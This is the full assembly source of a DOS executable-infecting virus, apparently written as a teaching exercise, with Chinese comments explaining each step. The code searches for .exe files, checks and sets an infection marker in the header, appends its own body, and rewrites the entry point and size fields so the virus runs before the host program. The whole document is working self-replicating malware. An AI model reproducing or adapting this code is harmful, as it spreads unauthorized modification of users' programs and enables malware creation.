code segment
    assume cs:code
start:
    jmp begin
    mark dw 8899h
    fn db "virus.exe",0
begin:
    mov ax,cs
    mov ds,ax

    call virus

    cmp bp,0
    jnz source
    mov ah,4ch
    int 21h
source:
    mov ax,4200h ;到文件头
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,3fh ;读文件头
    mov cx,30h ;长度
    lea dx,[bp+offset head]
    mov si,dx
    int 21h

    push cs ;跳转回原程序代码
    mov ax,word ptr [si+02eh]
    push ax
    retf

virus proc
    call first
first:
    pop bp
    sub bp,offset first
    lea dx,[bp+offset string]
    mov ah,09h           ;输出标志字符串，表明自身病毒身份
    int 21h

    lea dx,[bp+offset dta] ;置dta，后来查找到文件信息存在dta里
    mov ah,1ah
    int 21h

    lea dx,[bp+offset filename]  ;查询第一个exe文件
    mov cx,0
    mov ah,4eh
    int 21h
    jnc spread
	ret

spread:
    lea dx,[bp+offset dta]  ;搜索信息存在dta里，这里是为了取dta信息
    add dx,1eh  ;跳过其他信息，指向文件名地址

    mov ax,3d02h ;打开文件
    int 21h

    mov bx,ax   ;bx存放文件句柄
    
    mov ax,4200h   ;移动指针到文件头
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,3fh   ;读取文件的文件头部分
    mov cx,30h      
    lea dx,[bp+offset head] ;读取到的文件头信息置于head里
    mov si,dx               ;记住这里si指向head
    int 21h

    cmp word ptr [si],5a4dh ;检查文件是不是exe文件
    jnz nextfile            ;如果不是，检索下一个文件

    cmp word ptr [si+2ah],4321h ;检查是否已被感染
    je nextfile                 ;若是，检索下一个文件

    ;经过上面两层筛选，得知此文件为未被感染的exe文件，下面开始将其注入病毒
    mov word ptr [si+2ah],4321h      ;首先设置标志位，正常文件head的2a位置是默认为0000的，感染后改成4321h

    mov ax,word ptr [si+014h] ;保存原程序入口IP，以在病毒文件执行完后跳回到原程序
    mov word ptr [si+02eh],ax  ;存到了这里

    xor cx,cx ;将指针移动到文件尾
    xor dx,dx
    mov ax,4202h
    int 21h

    push ax
    sub ax,200h          ;此时ax表示指针位置，即文件尾位置，减去head部分200h
    mov cx,ax          
    mov ax,[si+16h]       ;CS的相对偏移地址
    mov dx,10h
    mul dx
    sub cx,ax
    mov word ptr [si+14h],cx  ;修改程序入口，使exe文件先执行virus部分
    pop ax

    lea dx,[bp+offset start] 
    lea cx,[bp+offset finish]
    sub cx,dx   ;计算得到病毒长度
    mov ah,40h
    int 21h

    ;重新计算文件长度
    mov ax,4202h     ;移动指针到文件末尾
    xor cx,cx
    xor dx,dx
    int 21h    
    mov cx,200h
    div cx
    inc ax        ;计算扇区数量
    mov word ptr [si+2],dx  ;最后一个扇区的大小
    mov word ptr [si+4],ax  ;扇区数量
    
    ;刚才修改的都放在head里，下面将head写入文件头
    mov ax,4200h  ;移动指针到文件头
    xor cx,cx
    xor dx,dx
    int 21h
    mov ah,40h
    mov dx,si     ;即head位置
    mov cx,30h     ;长度
    int 21h

nextfile:
    mov ah,3eh ;首先是关闭上一个文件
    int 21h

    mov ah,4fh ;查找下一个文件
    int 21h
    jc error
    jmp spread

error:
    ret
virus endp

data:
filename db "*.exe",0
dta db 02bh dup(0)
string db "This ia a virus",13,10,"$"
head db 30h dup(0)

finish:
code ends
end start